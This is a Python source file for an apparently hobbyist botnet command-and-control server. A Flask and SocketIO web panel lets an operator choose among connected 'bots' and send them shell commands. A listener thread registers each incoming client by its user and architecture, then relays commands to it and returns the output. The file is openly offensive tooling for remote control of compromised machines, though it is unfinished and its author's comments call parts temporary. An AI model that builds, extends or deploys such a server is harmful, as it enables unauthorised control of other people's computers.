import socket
import time
import json
from threading import Thread
from flask import Flask, render_template, session, request
from flask_socketio import SocketIO, emit

''' Sumner: if you are reading this I have only just got the main concept working,
Looks pretty dope though so far.

 To run: python server.py'''

HOST = 'localhost'
PORT = 1708
allConnections = {}
connected = 'EvanKing' #temp variable for testing

# Set this variable to "threading", "eventlet" or "gevent" to test the
# different async modes, or leave it set to None for the application to choose
# the best option based on installed packages.
async_mode = None

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode=async_mode)
thread = None


@app.route('/', methods=['GET', 'POST'])
def index():
    global connected
    if request.method == 'POST':
        select = request.form.get('bot')
        connected = str(select)
    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)


@socketio.on('my_event', namespace='/bot')
def test_message(cmd):
    output = allConnections[connected].send(cmd['data'])
    output = json.loads(output)['output']
    if output:
        emit('my_response',
             {'data': output[:-1]})


#TODO: not done
@app.route("/", methods=['GET', 'POST'])
def bot_selector():
    select = request.form.get('bot')
    connected = str(select)
    print connected

class BotNet(Thread):
    def __init__(self, tcpsock):
        Thread.__init__(self)
        self.tcpsock = tcpsock

    def run(self):
        while 1:
            self.tcpsock.listen(5)
            (clientsock, (ip, port)) = self.tcpsock.accept()
            host_info = json.loads(recv_timeout(clientsock))
            print "[+] Recieved connection from {}".format(host_info['user'])
            allConnections[host_info['user'][:-1]] = Bot(clientsock, host_info)


# TODO: can make this multi-threaded if want to send to multiple clients at once
class Bot:
    def __init__(self, sock, host_info):
        self.sock = sock
        self.arch = host_info['arch']
        self.user = host_info['user']

    def send(self, cmd):
        cmd += '\n'
        totalsent = 0
        while totalsent < len(cmd):
            sent = self.sock.send(cmd[totalsent:])
            if sent == 0:
                raise RuntimeError("[-] Lost connection to {}".format(self.user))
            totalsent = totalsent + sent

        response = recv_timeout(self.sock)
        return response


# TODO: timeout is not necessarily optimal recv method
def recv_timeout(socket, timeout=.2):
    socket.setblocking(0)
    total_data = [];
    begin = time.time()
    while 1:
        # if you got some data, then break after wait sec
        if total_data and time.time() - begin > timeout:
            break
        # if you got no data at all, wait a little longer
        elif time.time() - begin > timeout * 2:
            break
        try:
            data = socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.05)
        except:
            pass
    return ''.join(total_data)


if __name__ == "__main__":
    TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPSOCK.bind((HOST, PORT))
    BotNet(TCPSOCK).start()

    socketio.run(app, debug=True, use_reloader=False)
